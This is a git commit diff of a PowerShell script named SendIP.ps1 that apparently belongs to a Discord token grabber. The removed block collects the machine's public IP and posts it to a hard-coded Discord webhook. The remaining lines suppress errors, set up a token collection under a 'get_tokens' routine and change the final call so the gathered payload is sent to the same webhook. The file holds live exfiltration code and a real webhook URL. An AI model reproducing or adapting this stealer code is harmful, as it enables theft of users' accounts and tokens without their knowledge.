2a36724673932fc20d68d766e2fa29e6e4f3feb8
9742-gif <discord.trs.12@gmail.com>
2025-07-26 15:28:46 +0300

    Update SendIP.ps1

--- SendIP.ps1
+++ SendIP.ps1
@@ -1,21 +1,3 @@
-# SendIP.ps1 - إرسال IP إلى Discord Webhook
-
-# رابط Webhook (استبدله بالرابط الحقيقي)
-$webhook = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"
-
-# الحصول على عنوان IP
-$ip = Invoke-RestMethod -Uri "https://api.ipify.org"
-
-# تنسيق البيانات
-$body = @{
-    content = ":satellite: IP Address Logged: $ip"
-} | ConvertTo-Json
-
-# إرسال إلى Webhook
-Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
-
-
-
 $ErrorActionPreference= 'silentlycontinue'
 $tokensString = new-object System.Collections.Specialized.StringCollection
 $webhook_url = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"
@@ -107,5 +89,7 @@ run get_tokens {
         }
     }
 }
-Invoke-RestMethod -Uri $payload -Method Post -ContentType "application/json" -Body $body
+
+
+Invoke-WebRequest -Uri $webhook_url -Method POST -Body $payload -ContentType "application/json"
 
